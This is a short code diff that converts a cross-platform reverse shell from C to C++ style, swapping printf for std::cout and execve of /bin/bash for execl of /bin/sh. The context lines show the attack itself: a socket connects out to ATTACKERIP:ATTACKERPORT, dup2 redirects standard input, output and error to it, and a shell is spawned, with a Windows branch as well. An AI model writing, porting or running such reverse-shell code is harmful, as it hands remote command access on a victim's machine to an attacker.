@@ -1,5 +1,5 @@
-#include <stdio.h>
-#include <string.h>
+#include <iostream>
+#include <cstring>
 
 #if defined(_WIN32) || defined(WIN32)
     #include <winsock2.h>
@@ -36,7 +36,7 @@ int main() {
         return 1;
     }
 
-    printf("Connected to %s:%d\n", ATTACKERIP, ATTACKERPORT);
+    std::cout << "Connected to " << ATTACKERIP << ":" << ATTACKERPORT << std::endl;
 
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
@@ -64,15 +64,13 @@ int main() {
 
     if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) return 1;
 
-    printf("Connected to %s:%d\n", ATTACKERIP, ATTACKERPORT);
+    std::cout << "Connected to " << ATTACKERIP << ":" << ATTACKERPORT << std::endl;
 
     dup2(s, 0);
     dup2(s, 1);
     dup2(s, 2);
 
-    const char* path = "/bin/bash";
-    char* args[] = {(char*)path, NULL};
-    execve(path, args, NULL);
+    execl("/bin/sh", "sh", (char*)NULL);
 #endif
 
     CLOSESOCKET(s);
